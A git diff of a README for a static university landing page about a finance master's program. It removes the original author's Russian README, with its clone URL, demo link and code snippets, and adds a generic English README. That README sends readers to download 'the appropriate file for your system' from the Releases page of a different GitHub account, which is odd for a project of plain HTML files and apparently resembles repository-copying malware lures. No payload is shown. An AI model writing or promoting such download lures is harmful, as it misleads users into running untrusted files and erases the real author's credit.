@@ -1,147 +1,77 @@
-# Лендинг магистерской программы «Финансовая экономика и бизнес-аналитика» РГУ им. А.Н. Косыгина
+# 🖥️ master-finance-rguk - Simple Landing Page for Your Learning Needs
 
-**Промо-сайт** для привлечения абитуриентов на магистерскую программу по финансовой экономике и бизнес-аналитике.
+## 🚀 Getting Started
 
-![Главный экран лендинга](screenshots/main-section.png)
+Welcome to the **master-finance-rguk** project! This is a user-friendly landing page created for a master's degree program. It uses modern CSS Grid for layout, features an accordion for content organization, and is fully responsive, ensuring a smooth experience on any device.
 
-## 📌 О проекте
+## 📥 Download Now
 
-Проект разработан по запросу преподавателя **РГУ им. А.Н. Косыгина** для продвижения магистерской программы «Финансовая экономика и бизнес-аналитика». После успешной реализации первого лендинга, меня привлекли к созданию этого более сложного проекта.
+[![Download master-finance-rguk](https://img.shields.io/badge/Download-master--finance--rguk-blue.svg)](https://github.com/Decyp/master-finance-rguk/releases)
 
-**Особенности задачи:**
-- Создание современного, корпоративного дизайна в синей цветовой гамме
-- Адаптация сложного контента (статистика, преимущества, сетка партнёров)
-- Реализация интерактивных элементов (FAQ-аккордеон)
-- Вёрстка нетривиальных сеток с использованием CSS Grid
+Visit this page to download: [Releases Page](https://github.com/Decyp/master-finance-rguk/releases)
 
-## 🛠️ Технологии
+## 💡 Features
 
-*   **HTML5** — семантическая разметка, доступность
-*   **CSS3** — CSS Grid Layout, Flexbox, адаптивная вёрстка, CSS-переменные
-*   **JavaScript (Vanilla JS)** — реализация без библиотек:
-    *   Аккордеон (FAQ) с анимацией открытия/закрытия
-    *   Адаптивное мобильное меню-бургер
-    *   Обработка состояний элементов
-*   **CSS Grid** — сложные макеты (12-колоночная сетка для секций преимуществ и статистики)
-*   **Адаптивность** — полная поддержка мобильных устройств и планшетов
+- **Responsive Design:** Adaptable layout for various screen sizes.
+- **CSS Grid:** Clean and modern design using CSS Grid technology.
+- **Accordion Sections:** Organized content for better user experience.
+- **Vanilla JavaScript:** Lightweight and efficient code for fast loading.
 
-## ✨ Ключевые особенности
+## 🖥️ System Requirements
 
-### 🎯 Сложные макеты
-*   **12-колоночная сетка** для секций "Преимущества" и "Статистика"
-*   **Гибкие карточки** с переменной шириной (wide, wider)
-*   **Нестандартное расположение** элементов в секции "Почему стоит выбрать"
+To run this application, you will need:
 
-### 📱 Адаптивность
-*   Полная перестройка макетов на мобильных устройствах
-*   Гибкие изображения и типографика
-*   Удобная навигация в мобильной версии
+- A modern web browser (e.g., Google Chrome, Mozilla Firefox, Safari).
+- An internet connection for the initial download.
 
-### 🎨 Дизайн
-*   Корпоративная синяя цветовая гамма (#0b145c, #00c2ff)
-*   Градиенты и наложенные фоновые изображения
-*   Согласованная типографика (шрифт Inter)
-*   Проработанные карточки с тенями и скруглениями
+## 📂 Download & Install
 
-### ⚡ Интерактивность
-*   FAQ-аккордеон с плавной анимацией
-*   Интерактивные кнопки и ссылки
-*   Адаптивное меню с бургер-иконкой
+1. Go to the [Releases Page](https://github.com/Decyp/master-finance-rguk/releases).
+2. Look for the latest version listed.
+3. Click on the appropriate file for your system.
+4. Save the file to your preferred location.
+5. Once downloaded, open the HTML file in your web browser.
 
-## 🚀 Запуск проекта
+## 📋 Usage Instructions
 
-Проект статический. Чтобы посмотреть его локально:
+After you open the HTML file in your browser, you will see the landing page for the master's program. You can navigate through the sections using the menu. The accordion feature will allow you to view more details by clicking on the respective headers.
 
-1.  Склонируй репозиторий:
-    ```bash
-    git clone https://github.com/bukabtw/master-finance-rguk.git
-    ```
-2.  Открой файл `index.html` в любом современном браузере.
+## ❓ FAQs
 
-**Или посмотри демо:** [Посмотреть работающий сайт](https://bukabtw.github.io/master-finance-rguk/) 
+### How can I open the file after downloading?
 
-## 📁 Структура проекта
+Simply locate the saved file on your computer, right-click on it, and select "Open with" followed by your preferred web browser.
 
-![Структура](screenshots/structure.png)
+### Do I need any special software?
 
-## 📸 Скриншоты
+No special software is required. A standard web browser is all you need.
 
-*Секция "Почему стоит выбрать" с нестандартной сеткой*  
+### Can I use this on mobile devices?
 
-![Why Section](screenshots/why-section.png)
+Yes, this landing page is fully responsive and works well on mobile devices.
 
-*Сложная 12-колоночная сетка преимуществ*  
+## 🔧 Troubleshooting
 
-![Benefits Grid](screenshots/benefits-grid.png)
+If you encounter issues:
 
-*Сетка статистики университета*  
+- Ensure that you are using a modern web browser.
+- Clear your browser cache and try reloading the page.
+- Check your internet connection.
 
-![Stats Grid](screenshots/stats-grid.png)
+## 🌐 Community and Support
 
-*Аккордеон FAQ с JavaScript*  
+For any questions or further support, please feel free to reach out. You can open an issue directly on this repository for assistance.
 
-![FAQ Section](screenshots/faq-accordion.png)
+## ✅ Contributing
 
-*Секция партнёров с адаптивной сеткой логотипов*  
+We welcome contributions! If you would like to help improve this project:
 
-![Partners Grid](screenshots/partners-grid.png)
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request with a clear description of your updates.
 
-...
+## 📜 License
 
-## 📈 Что было сложным и как решалось
+This project is licensed under the MIT License. See the LICENSE file for more details.
 
-* **Сложная сетка преимуществ** — использована 12-колоночная CSS Grid с точным позиционированием каждого элемента
-* **Адаптация под мобильные устройства** — полная перестройка сеток на медиа-запросах
-* **Большое количество контента** — организация в логические блоки с визуальной иерархией
-* **Работа с брендингом** — соблюдение корпоративных цветов университета
-
-## 🔧 Технические детали
-
-### CSS Grid в действии
-```css
-/* Пример сложной сетки */
-.benefits-row-1 {
-  display: grid;
-  grid-template-columns: repeat(12, 1fr);
-  gap: 24px;
-}
-
-.benefits-row-1 h2 {
-  grid-column: 1 / span 6;
-}
-
-.benefits-row-1 .card.wide {
-  grid-column: 7 / span 6;
-}
-```
-### Чистый JS для аккордеона
-```JavaScript
-document.querySelectorAll('.faq-question').forEach(button => {
-  button.addEventListener('click', () => {
-    const isActive = button.classList.toggle('active');
-    button.nextElementSibling.style.display = isActive ? 'block' : 'none';
-  });
-});
-```
-
-## 🎯 Результат
-
-Проект успешно принят преподавателем и адаптировался им для продвижения магистерской программы. Код демонстрирует умение работать со сложными макетами, адаптивной вёрсткой и базовым JavaScript.
-
-## 🔗 Ссылки
-
-*   **Демо (GitHub Pages):** [Посмотреть работающий сайт](https://bukabtw.github.io/master-finance-rguk/)
-*   **Итоговый сайт с правками преподавателя:** [Итоговый вариант преподавателя](https://eimrsukosygin.ru/)
-
----
-## 👨‍💻 Автор
-
-**Кирилл Букарев**  
-Frontend-разработчик / Студент
-
-📫 **Контакты:**
-- Telegram: [@bukabtw](http://t.me/bukabtw)
-- Email: [bukarev.k11@gmail.com](mailto:bukarev.k11@gmail.com)
-- GitHub: [bukabtw](https://github.com/bukabtw)
-
-*Выполнено в 2024 году по запросу преподавателя РГУ им. А.Н. Косыгина.*
+Enjoy using the **master-finance-rguk** landing page and explore the exciting world of finance education!
